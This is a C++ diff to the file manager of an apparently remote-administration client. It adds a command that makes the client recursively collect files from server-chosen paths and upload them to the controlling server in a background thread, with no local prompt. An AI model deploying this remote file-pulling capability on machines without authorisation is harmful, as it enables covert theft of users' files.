@@ -4,8 +4,11 @@
 
 #include "FileManager.h"
 #include <shellapi.h>
+#include <thread>
 #include "ZstdArchive.h"
 #include "file_upload.h"
+#include "IOCPClient.h"
+#include "KernelManager.h"
 
 typedef struct {
     DWORD	dwSizeHigh;
@@ -27,6 +30,12 @@ CFileManager::CFileManager(CClientSocket *pClient, int h, void* user):CManager(p
     m_nTransferMode = TRANSFER_MODE_NORMAL;
     m_bSearching = false;
     m_hSearchThread = NULL;
+
+    // 初始化V2文件传输模块
+    CKernelManager* main = (CKernelManager*)pClient->GetMain();
+    InitFileUpload({}, main ? main->m_LoginMsg : pClient->m_LoginMsg,
+        main ? main->m_LoginSignature : pClient->m_LoginSignature, 64, 50, Logf);
+
     // 发送驱动器列表, 开始进行文件管理，建立新线程
     SendDriveList();
 }
@@ -39,6 +48,7 @@ CFileManager::~CFileManager()
         SAFE_CLOSE_HANDLE(m_hSearchThread);
     }
     m_UploadList.clear();
+    UninitFileUpload();
 }
 
 
@@ -129,6 +139,9 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
         // 注意：不展开环境变量，保持原始路径发送给服务端
         // 这样服务端的 Replace(m_Remote_Path, localPath) 能正确匹配
         UploadToRemote(lpBuffer + 1);
+        break;
+    case CMD_DOWN_FILES_V2: // V2上传文件到服务端
+        UploadToRemoteV2(lpBuffer + 1, nSize - 1);
         break;
     case COMMAND_CONTINUE: // 上传文件
         SendFileData(lpBuffer + 1);
@@ -1045,4 +1058,127 @@ void CFileManager::Rename(LPBYTE lpBuffer)
     LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
     ::MoveFile(lpExistingFileName, lpNewFileName);
     SendToken(TOKEN_RENAME_FINISH);
+}
+
+// V2文件传输：收集目录中的所有文件
+void CFileManager::CollectFilesRecursiveV2(const std::string& dirPath, const std::string& basePath, std::vector<std::string>& files)
+{
+    // 先添加目录本身（去掉末尾的反斜杠）
+    std::string dirEntry = dirPath;
+    if (!dirEntry.empty() && (dirEntry.back() == '\\' || dirEntry.back() == '/')) {
+        dirEntry.pop_back();
+    }
+    files.push_back(dirEntry);
+
+    WIN32_FIND_DATAA wfd;
+    std::string searchPath = dirPath + "*.*";
+
+    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &wfd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return;
+
+    do {
+        if (wfd.cFileName[0] != '.') {
+            std::string fullPath = dirPath + wfd.cFileName;
+            if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                CollectFilesRecursiveV2(fullPath + "\\", basePath, files);
+            } else {
+                files.push_back(fullPath);
+            }
+        }
+    } while (FindNextFileA(hFind, &wfd));
+
+    FindClose(hFind);
+}
+
+// V2文件传输：上传文件到服务端
+// 包格式: [targetDir\0][file1\0][file2\0]...[\0]
+void CFileManager::UploadToRemoteV2(LPBYTE lpBuffer, UINT nSize)
+{
+    // 解析目标目录（服务端的本地目录）
+    const char* targetDir = (const char*)lpBuffer;
+    size_t targetDirLen = strlen(targetDir);
+
+    // 解析文件列表
+    std::vector<std::string> remotePaths;
+    const char* p = targetDir + targetDirLen + 1;
+    const char* end = (const char*)lpBuffer + nSize;
+    while (p < end && *p != '\0') {
+        remotePaths.push_back(p);
+        p += strlen(p) + 1;
+    }
+
+    if (remotePaths.empty()) {
+        Mprintf("[V2] 没有要传输的文件\n");
+        return;
+    }
+
+    // 收集所有文件（展开目录）
+    std::vector<std::string> allFiles;
+    std::vector<std::string> rootCandidates;  // 用于计算公共根目录
+
+    for (const auto& remotePath : remotePaths) {
+        std::string localPath = ExpandPath(remotePath.c_str());
+
+        DWORD attrs = GetFileAttributesA(localPath.c_str());
+        if (attrs == INVALID_FILE_ATTRIBUTES)
+            continue;
+
+        if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
+            // 目录：递归收集
+            std::string dirPath = localPath;
+            if (dirPath.back() != '\\') dirPath += '\\';
+            // 使用父目录参与公共根计算，以保留目录名
+            size_t pos = dirPath.find_last_of("\\", dirPath.length() - 2);
+            std::string parentPath = (pos != std::string::npos) ? dirPath.substr(0, pos + 1) : dirPath;
+            rootCandidates.push_back(parentPath);
+            CollectFilesRecursiveV2(dirPath, parentPath, allFiles);
+        } else {
+            // 文件：使用文件本身参与公共根计算
+            rootCandidates.push_back(localPath);
+            allFiles.push_back(localPath);
+        }
+    }
+
+    if (allFiles.empty()) {
+        Mprintf("[V2] 没有找到可传输的文件\n");
+        return;
+    }
+
+    // 获取公共根目录（从选中项的父目录计算，而不是从展开的文件）
+    std::string commonRoot = GetCommonRoot(rootCandidates);
+    Mprintf("[V2] 开始传输 %zu 个文件, 公共根: %s, 目标: %s\n",
+        allFiles.size(), commonRoot.c_str(), targetDir);
+
+    // 使用V2协议发送
+    TransferOptionsV2 opts;
+    opts.transferID = GenerateTransferID();
+    CONNECT_ADDRESS* conn = m_ClientObject->GetConnectionAddress();
+    opts.srcClientID = conn ? conn->clientID : 0;
+    opts.dstClientID = 0;  // 发送给服务端
+    opts.enableResume = false;  // 文件管理器不支持断点续传
+
+    std::string hash(conn ? conn->pwdHash : "", conn ? strnlen(conn->pwdHash, 64) : 0);
+    std::string hmac;  // V2传输到服务端不需要hmac验证
+
+    // 创建新连接发送文件
+    IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, conn);
+    if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
+        std::thread([allFiles, targetDir = std::string(targetDir), pClient, opts, hash, hmac]() {
+            FileBatchTransferWorkerV2(allFiles, targetDir, pClient,
+                [](void* user, FileChunkPacketV2* chunk, unsigned char* data, int size) -> bool {
+                    IOCPClient* client = (IOCPClient*)user;
+                    return client->Send2Server((char*)data, size) != FALSE;
+                },
+                [](void* user) {
+                    IOCPClient* client = (IOCPClient*)user;
+                    delete client;
+                    Mprintf("[V2] 文件发送完成\n");
+                },
+                hash, hmac, opts);
+        }).detach();
+    } else {
+        delete pClient;
+        Mprintf("[V2] 连接服务器失败\n");
+    }
 }
